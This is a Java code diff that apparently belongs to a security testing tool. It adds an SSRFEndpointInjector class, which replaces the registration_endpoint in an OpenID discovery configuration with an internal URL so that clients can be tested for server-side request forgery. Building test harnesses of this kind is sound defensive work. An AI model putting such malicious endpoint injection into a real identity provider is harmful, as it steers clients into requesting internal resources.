@@ -67,6 +67,24 @@ public interface MaliciousEndpointInjector {
 
             return discoveryConfiguration;
         }
+    }
 
+    static class SSRFEndpointInjector implements MaliciousEndpointInjector {
+
+        private static final Logger LOGGER = LoggerFactory.getLogger(SSRFEndpointInjector.class);
+
+        @Override
+        public Map<String, Object> inject(final Map<String, Object> discoveryConfiguration) {
+
+            final Map<String, Object> maliciousEndpoints = new HashMap<>();
+
+            maliciousEndpoints.put("registration_endpoint", "http://internal-resource/api");
+
+            LOGGER.info("Injecting malicious endpoints: {}", maliciousEndpoints);
+
+            discoveryConfiguration.putAll(maliciousEndpoints);
+
+            return discoveryConfiguration;
+        }
     }
 }
